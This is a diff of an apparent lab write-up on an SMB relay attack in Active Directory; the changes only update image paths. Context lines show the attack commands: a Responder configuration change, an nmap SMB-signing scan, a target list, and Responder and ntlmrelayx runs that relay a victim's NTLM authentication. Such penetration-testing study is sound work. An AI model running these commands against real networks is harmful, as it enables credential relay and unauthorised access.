@@ -113,7 +113,7 @@ sudo nano /etc/responder/Responder.conf
 ```
 
 <p align="center">
-  <img src="/writeups/02-smb-relay/images/step1-1.png" width="600">
+  <img src="/Active-Directory/02-smb-relay/images/step1-1.png" width="600">
 </p>
 
 Inside the file, I found and changed the following settings:
@@ -124,7 +124,7 @@ HTTP = Off
 ```
 
 <p align="center">
-  <img src="/writeups/02-smb-relay/images/step1-2.png" width="600">
+  <img src="/Active-Directory/02-smb-relay/images/step1-2.png" width="600">
 </p>
 
 After that, I saved the file:
@@ -154,7 +154,7 @@ nmap --script smb2-security-mode -p 445 192.168.5.0/24
 ```
 
 <p align="center">
-  <img src="/writeups/02-smb-relay/images/step2.png" width="600">
+  <img src="/Active-Directory/02-smb-relay/images/step2.png" width="600">
 </p>
 
 ### Step 3: Create Target List
@@ -165,7 +165,7 @@ I created a file to store the target IP addresses:
 nano targets.txt
 ```
 <p align="center">
-  <img src="/writeups/02-smb-relay/images/step3-1.png" width="600">
+  <img src="/Active-Directory/02-smb-relay/images/step3-1.png" width="600">
 </p>
 
 Inside the file, I added the target IPs:
@@ -176,7 +176,7 @@ Inside the file, I added the target IPs:
 192.168.5.136
 ```
 <p align="center">
-  <img src="/writeups/02-smb-relay/images/step3-2.png" width="600">
+  <img src="/Active-Directory/02-smb-relay/images/step3-2.png" width="600">
 </p>
 
 After that, I saved the file:
@@ -204,7 +204,7 @@ sudo responder -I eth0 -dwv
 ```
 
 <p align="center">
-  <img src="/writeups/02-smb-relay/images/step4.png" width="600">
+  <img src="/Active-Directory/02-smb-relay/images/step4.png" width="600">
 </p>
 
 ### Step 5: Start ntlmrelayx
@@ -224,7 +224,7 @@ sudo ntlmrelayx.py -tf targets.txt -smb2support
 ```
 
 <p align="center">
-  <img src="/writeups/02-smb-relay/images/step5.png" width="600">
+  <img src="/Active-Directory/02-smb-relay/images/step5.png" width="600">
 </p>
 
 ### Step 6: Trigger Authentication
@@ -237,7 +237,7 @@ From the victim machine, I opened File Explorer and typed:
 After pressing Enter, the system tried to connect and sent NTLM authentication over the network.
 
 <p align="center">
-  <img src="/writeups/02-smb-relay/images/step6.png" width="600">
+  <img src="/Active-Directory/02-smb-relay/images/step6.png" width="600">
 </p>
 
 ### Step 7: Successful Relay
@@ -245,7 +245,7 @@ After pressing Enter, the system tried to connect and sent NTLM authentication o
 The relay attack worked successfully, and the authentication was accepted by the target system.
 
 <p align="center">
-  <img src="/writeups/02-smb-relay/images/step7.png" width="600">
+  <img src="/Active-Directory/02-smb-relay/images/step7.png" width="600">
 </p>
 
 
